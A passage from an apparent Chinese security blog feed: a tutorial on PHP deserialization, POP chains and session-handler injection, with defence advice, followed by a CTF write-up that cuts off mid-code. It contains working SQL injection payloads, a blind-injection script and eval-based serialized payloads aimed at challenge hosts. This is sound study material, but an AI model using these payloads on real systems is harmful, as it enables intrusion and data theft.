Read.__invoke</span><br></pre></td></tr></table></figure><p>注意对象关系（hello是Show的对象，source属性是Test的对象，p属性是Read的对象），然后写一个POP链的对应EXP，就可以了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$read = <span class="keyword">new</span> Read();</span><br><span class="line">$test-&gt;p = $read;</span><br><span class="line">$show-&gt;source = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($show);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/25MVI1unUSGebAy.png"></p><h2 id="0x03-php的Session反序列化问题"><a href="#0x03-php的Session反序列化问题" class="headerlink" title="0x03 php的Session反序列化问题"></a>0x03 php的Session反序列化问题</h2><h3 id="3-1-PHP的Session存储机制"><a href="#3-1-PHP的Session存储机制" class="headerlink" title="3.1 PHP的Session存储机制"></a>3.1 PHP的Session存储机制</h3><p><code>php.ini</code>有一下配置项用于控制Session有关的设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;D:\xampp\tmp&quot;    表明所有的session文件都是存储在xampp&#x2F;tmp下</span><br><span class="line">session.save_handler&#x3D;files          表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start&#x3D;0                表明默认不启动session</span><br><span class="line">session.serialize_handler&#x3D;php       表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure><p>PHP中有多种session的序列话引擎，当我设置session为<code>$_SESSION[&quot;name&quot;] = &quot;V0W&quot;;</code>时。不同的引擎保存的session文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php: </span><br><span class="line">    name|s:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php_binary:</span><br><span class="line">    names:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):</span><br><span class="line">    a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;V0W&quot;;&#125;</span><br><span class="line">    存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>切换不同引擎使用的函数：</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;调用引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另外文件名，其实是<code>PHPSESSIONID</code>的值</p><p><img src="https://i.loli.net/2020/03/11/Q4isJOLn6tG2euE.png"></p><h3 id="3-2-PHP的Session反序列化漏洞原理"><a href="#3-2-PHP的Session反序列化漏洞原理" class="headerlink" title="3.2 PHP的Session反序列化漏洞原理"></a>3.2 PHP的Session反序列化漏洞原理</h3><p>如果在PHP在反序列化存储的<code>$_SESSION</code>数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确地反序列化。如果session值可控，则可通过构造特殊的session值导致反序列化漏洞。</p><p>用原文的一个例子：</p><p><code>session.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&quot;spoock&quot;</span>]=$_GET[<span class="string">&quot;a&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>session2.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>session.php中的Session是可控的，但是反序列的魔术方法在session2.php中，而session中的参数无法直接可控。</p><p>这个时候，就可以利用两个的php的session存储机制的不同实现session的反序列化攻击。</p><p>具体说：</p><ol><li><p>将payload用session.php，控制存储在指定文件中。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.php?a&#x3D;|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化，并存储到文件中。</p></li><li><p>再访问session2.php，页面输出<code>spoock</code>,成功执行我们构造的函数。因为在访问session2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据（因为同域<code>PHPSESSIONID</code>是一样的，之前存的session也适用），此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p></li><li><p>可以单步调试一下，更容易理解这两个过程。</p><p><img src="https://i.loli.net/2020/03/11/G4Uh2sDx3grIHL9.png"></p><p><img src="https://i.loli.net/2020/03/11/eUb4csuApvX931V.png"></p></li></ol><h3 id="3-3-更进一步的Session反序列化利用"><a href="#3-3-更进一步的Session反序列化利用" class="headerlink" title="3.3 更进一步的Session反序列化利用"></a>3.3 更进一步的Session反序列化利用</h3><p>上述的利用达到了攻击目的，但是，局限性比较大，我们看一下条件：</p><ol><li>两个文件session引擎配置不同</li><li>其中一个session可控</li><li>两个文件同域</li></ol><p>如何更进一步的利用，或者较少限制的利用Session反序列化呢？</p><p>在<a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a>中介绍了另一种Session反序列化漏洞的利用方式。</p><p>当PHP中<code>session.upload_progress.enabled</code>打开时，php会记录上传文件的进度，在上传时会将其信息保存在<code>$_SESSION</code>中。<a href="https://bugs.php.net/bug.php?id=71101">phpbugs详情</a>（还有老外的讨论也可以看一下）</p><p>看一下这个漏洞（我为其命名：上传程序Session漏洞）出现的条件：</p><ol><li><code>session.upload_progress.enabled = On</code> (是否启用上传进度报告)</li><li><code>session.upload_progress.cleanup = Off</code> (是否上传完成之后删除session文件)</li></ol><p>符合条件时，上传文件进度的报告就会以写入到session文件中，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。</p><h3 id="3-4-实例"><a href="#3-4-实例" class="headerlink" title="3.4 实例"></a>3.4 实例</h3><p>用jarvisoj上一个题目作为实例，<a href="http://web.jarvisoj.com:32784/">题目链接</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>容易发现，<code>OowoO.__destruct()</code>存在代码执行，但是没有可控参数进行利用。</p><p>然后发现符合上传程序Session漏洞的条件：</p><p><img src="https://i.loli.net/2020/03/11/gwD8aRGh4ZBYAxm.png"></p><p>接下来就是如何利用的问题了，我们知道这个漏洞出在上传时的Session存储问题上，所以我们可以利用上传来写入。</p><p>先自己写一个简单的上传页面upload.html：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">&quot;print_r(scandir(__dir__));&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到phpinfo中，禁用了<code>exec,system</code>等函数，注意用<code>print_r</code>绕过。</p><p><img src="https://i.loli.net/2020/03/11/WKjrgSeayOTEUxl.png"></p><p>再从phpinfo中的<code>SCRIPT_FILENAME</code>字段得到根目录地址：<code>/opt/lampp/htdocs/</code>,构造得到payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&#39;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/11/UnyYaeblrs3HDqQ.png"></p><h2 id="0x04-反序列化的防御"><a href="#0x04-反序列化的防御" class="headerlink" title="0x04 反序列化的防御"></a>0x04 反序列化的防御</h2><p>因为反序列化的缺陷可能导致远程代码执行等严重的攻击，所以我们需要对其进行防护：</p><ol><li>对传入 <code>unserilize()</code> 的参数，进行严格地过滤。</li><li>在文件系统函数的参数可控时，进行严格地过滤。</li><li>严格检查上传文件内容，不能只是单纯地检查文件头（phar）</li><li>条件允许的情况下，禁用可执行系统命令、代码的危险函数。</li><li>注意不同类中的同名方法的编写，避免被用作反序列化的跳板。</li><li>Session方面，一个是多文件间使用一种序列化引擎；二是尽量不要让session可控；三是保持<code>session.upload_progress.cleanup = On</code> (上传完成之后删除session文件)</li></ol><h2 id="0xff-参考链接"><a href="#0xff-参考链接" class="headerlink" title="0xff 参考链接"></a>0xff 参考链接</h2><ol><li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解漏洞之 PHP 反序列化漏洞</a> 2018,11 k0rn3n</li><li><a href="https://xz.aliyun.com/t/6454">PHP反序列化进阶学习与总结</a>, Threezh1, 先知社区</li><li><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制</a>, Spoock</li><li><a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a></li><li><a href="http://llfam.cn/2019/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95">php反序列化</a> 2019,04 llfam</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php反序列化与POP链&quot;&gt;&lt;a href=&quot;#php反序列化与POP链&quot; class=&quot;headerlink&quot; title=&quot;php反序列化与POP链&quot;&gt;&lt;/a&gt;php反序列化与POP链&lt;/h1&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://v0w.top/tags/php/"/>
    
    <category term="反序列化" scheme="http://v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>i春秋2020 新春公益赛</title>
    <link href="http://v0w.top/2020/02/26/ichunqiu2020gys/"/>
    <id>http://v0w.top/2020/02/26/ichunqiu2020gys/</id>
    <published>2020-02-25T16:00:00.000Z</published>
    <updated>2020-07-18T10:28:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>万用密码登录<code>admin</code>用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br><span class="line">123qwe</span><br></pre></td></tr></table></figure><p>在<code>blank-page</code>中的<code>search for key</code>处存在SQL注入，联合查询就可以了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pages-blank.php?key&#x3D;1&#39; or 1&#x3D;1 order by 5%23</span><br><span class="line">判断存在5个字段</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,2,3,4,5%23</span><br><span class="line">回显在2处</span><br><span class="line"></span><br><span class="line">&#x2F;pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line">表名：backup, flag, user</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;%23</span><br><span class="line">列名：id, flaaag</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,flaaag,3,4,5 from flag%23</span><br><span class="line">flag&#123;7e67c965-96e3-4cf4-b3f5-2cdea749bb7d&#125;</span><br></pre></td></tr></table></figure><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>无过滤，直接上传一句话，执行命令即可。白给？</p><p>下载下来研究一下怎么写的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($ext, [<span class="string">&#x27;php,htaccess,ini,&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组写错了，原意大概是<code>if (in_array($ext, [&#39;php&#39;,&#39;htaccess&#39;,&#39;ini&#39;]))</code>然后需要利用<code>phtml</code>绕过。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>打开题目得到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">&quot;select * from flllllllag where id=$id&quot;</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>虽然并不知道waf.php的过滤规则，但是很好fuzz，只要被匹配了就会<code>exit()</code>，fuzz发现<code>union</code> <code>select</code> <code>&#39;</code> <code>=</code>等常用关键字被ban了。没有等号可以使用基于<code>regexp</code>的时间盲注，该payload可成功延时:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 or if((substr((fl4g),1,1) regexp &quot;^f&quot;), sleep(5),1)</span><br></pre></td></tr></table></figure><p>所以就写脚本跑就行了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a4cbee3d20b542baaedefc971c0798dc808fea8f0de04dd9.changame.ichunqiu.com/?id=-1&quot;</span></span><br><span class="line">words = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(words) </span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;fl4g&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> words:</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line">payload =<span class="string">&#x27; or if((substr((&#123;&#125;),&#123;&#125;,1) regexp &quot;^&#123;&#125;&quot;),sleep(5),1)&#x27;</span>.format(target, i, char)</span><br><span class="line"><span class="comment"># 计算响应时长</span></span><br><span class="line">start = int(time.time())</span><br><span class="line">r = requests.get(url+quote(payload))</span><br><span class="line">response_time = int(time.time()) - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response_time &gt;= <span class="number">4</span>:</span><br><span class="line">result += char</span><br><span class="line">print(<span class="string">&#x27;flag: &#123;&#125;&#x27;</span>.format(result))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这道题，一开始没做出来，以为是文件包含，然后死活弄不出来。看了<code>P3rh4ps</code>师傅的<a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/">出题笔记</a>，发现思路错了，勉强复现出来。。。大佬牛逼，学到了0rz</p><p>本题主要涉及<strong>php反序列化</strong>和<strong>字符逃逸</strong>，以及<strong>POP链的构造</strong>，关于字符逃逸，我之前也没注意过，找了一篇文章，理解了一下原理——<a href="https://xz.aliyun.com/t/6718">详解PHP反序列化中的字符逃逸</a></p><p>扫描发现<code>www.zip</code>，下载审计。</p><p><code>login.php</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;lib.php&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;post&quot; style&#x3D;&quot;margin-top: 300&quot;&gt;</span><br><span class="line">&lt;h2&gt;百万前端的用户信息管理系统&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;UserName&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;password&quot; style&#x3D;&quot;margin-top: 20&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;password&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;button style&#x3D;&quot;margin-top:20;&quot; type&#x3D;&quot;submit&quot;&gt;登录&lt;&#x2F;button&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;img&#x2F;1.jpg&#39;&gt;大家记得做好防护&lt;&#x2F;img&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure><p><code>update.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>lib.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span 